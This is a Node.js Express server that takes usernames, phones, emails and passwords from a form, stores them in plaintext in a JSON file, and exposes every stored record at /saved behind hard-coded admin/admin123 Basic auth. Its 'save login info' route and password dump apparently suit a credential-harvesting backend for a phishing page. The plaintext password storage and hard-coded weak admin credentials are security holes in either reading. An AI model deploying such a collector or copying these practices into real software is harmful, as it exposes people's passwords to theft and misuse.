const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;  // Use environment port or 3000 locally

app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const DATA_FILE = path.join(__dirname, "savedUsers.json");

// Ensure the file exists on server startup
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, "[]", "utf-8");
}

// Serve index.html on root route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Read users from file
function readUsers() {
  const data = fs.readFileSync(DATA_FILE, "utf-8");
  return JSON.parse(data);
}

// Save users to file
function saveUsers(users) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2), "utf-8");
}

// Save login info (handles username and password from form)
app.post("/save", (req, res) => {
  const { username, phone, email, password } = req.body;

  if (!username || !password) {
    return res.status(400).send("Missing required fields: username and password");
  }

  const users = readUsers();

  const newUser = {
    username,
    phone: phone || "",
    email: email || "",
    password,
    timestamp: new Date().toISOString(),
  };

  users.push(newUser);
  saveUsers(users);
  res.send("User information saved successfully!");
});

// View saved user data (with basic auth)
app.get("/saved", (req, res) => {
  const auth = req.headers.authorization || "";
  const [user, pass] = Buffer.from(auth.split(" ")[1] || "", "base64")
    .toString("ascii")
    .split(":");

  if (user === "admin" && pass === "admin123") {
    const users = readUsers();
    res.json(users);
  } else {
    res.set("WWW-Authenticate", 'Basic realm="Restricted Area"');
    res.status(401).send("Authentication required");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
